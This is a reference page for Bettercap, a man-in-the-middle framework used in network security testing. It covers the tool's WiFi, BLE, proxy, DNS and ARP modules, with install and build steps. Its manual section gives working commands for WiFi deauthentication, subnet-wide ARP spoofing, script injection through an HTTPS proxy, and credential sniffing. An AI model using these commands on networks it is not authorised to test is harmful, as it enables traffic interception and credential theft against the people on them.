# Bettercap — Modular MITM Framework

Powerful, modular MITM framework for WiFi, BLE, HTTP(S), and DNS spoofing, sniffing, and injection. Extensible via Lua/Golang scripting.

## How It Works

Modular architecture: each module handles a protocol/attack vector. Core engine manages sessions, targets, and event bus.

**Key modules:**
- `wifi` — deauth, WPA handshake capture, PMKID, probe request sniffing, AP spoofing
- `ble` — BLE device scanning, connection, service enumeration, advertising spoofing
- `http.proxy` / `https.proxy` — HTTP/HTTPS interception, scriptable injection
- `dns.spoof` — DNS response spoofing
- `net.sniff` — passive network sniffing, credential extraction
- `arp.spoof` — ARP cache poisoning
- `dhcp6.spoof` — IPv6 RA/DHCPv6 spoofing

## Manual

```bash
# Start interactive session
sudo bettercap

# WiFi reconnaissance
wifi.recon on
wifi.show

# Deauth specific AP
wifi.deauth BSSID

# Set up HTTP/HTTPS proxy with script injection
set http.proxy.script /path/to/inject.js
http.proxy on
https.proxy on

# ARP spoof whole subnet
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Net sniff for credentials
net.sniff on

# Credentials capture
net.sniff stats
```

## Build

```bash
git clone https://github.com/bettercap/bettercap.git
cd bettercap
make build
sudo make install
```

## Install

```bash
# Debian/Ubuntu
sudo apt install bettercap

# macOS
brew install bettercap

# One-liner (Go binary)
sudo curl -L https://github.com/bettercap/bettercap/releases/download/v2.33.0/bettercap_linux_amd64.zip -o bettercap.zip
sudo unzip -o bettercap.zip -d /usr/local/bin/

# Docker
docker pull bettercap/bettercap
```

## Package

Prebuilt binaries on GitHub releases for Linux, macOS, Windows. Also in Kali, Arch AUR (`bettercap`).

## Links

| Resource | URL |
|----------|-----|
| Official site | https://www.bettercap.org/ |
| GitHub | https://github.com/bettercap/bettercap |
| Docs | https://www.bettercap.org/guide/ |
| Modules | https://www.bettercap.org/modules/ |
| Scripting API | https://www.bettercap.org/legacy/ |
| Android app | https://github.com/evilsocket/bettercap-android |
